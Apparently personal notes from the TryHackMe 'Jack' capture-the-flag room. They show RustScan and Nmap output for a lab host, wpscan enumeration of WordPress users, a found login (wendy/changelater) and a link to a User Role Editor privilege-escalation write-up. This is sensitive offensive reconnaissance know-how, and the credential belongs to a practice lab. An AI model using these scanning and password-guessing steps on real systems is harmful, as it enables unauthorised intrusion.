`rustscan`

```sh
┌──(bopbap㉿Matrix)-[~/Jack]
└─$ rustscan -a $IP --ulimit 5000 --range 1-65000 -t 2000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/bopbap/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.255.111:22
Open 10.10.255.111:80
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-29 11:27 EDT
Initiating Ping Scan at 11:27
Scanning 10.10.255.111 [2 ports]
Completed Ping Scan at 11:27, 0.23s elapsed (1 total hosts)
Initiating Connect Scan at 11:27
Scanning jack.thm (10.10.255.111) [2 ports]
Discovered open port 80/tcp on 10.10.255.111
Discovered open port 22/tcp on 10.10.255.111
Completed Connect Scan at 11:27, 0.22s elapsed (2 total ports)
Nmap scan report for jack.thm (10.10.255.111)
Host is up, received syn-ack (0.23s latency).
Scanned at 2023-07-29 11:27:58 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds

```

`nmap`
```sh

```

wpscan
```sh
┌──(bopbap㉿Matrix)-[~/Workspace/tryhackme/Jack]
└─$ wpscan --url jack.thm -e u1-5
[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

```sh

[!] Valid Combinations Found:
 | Username: wendy, Password: changelater
```

```sh
https://vk9-sec.com/wordpress-plugin-user-role-editor-4-24-privilege-escalation/
```

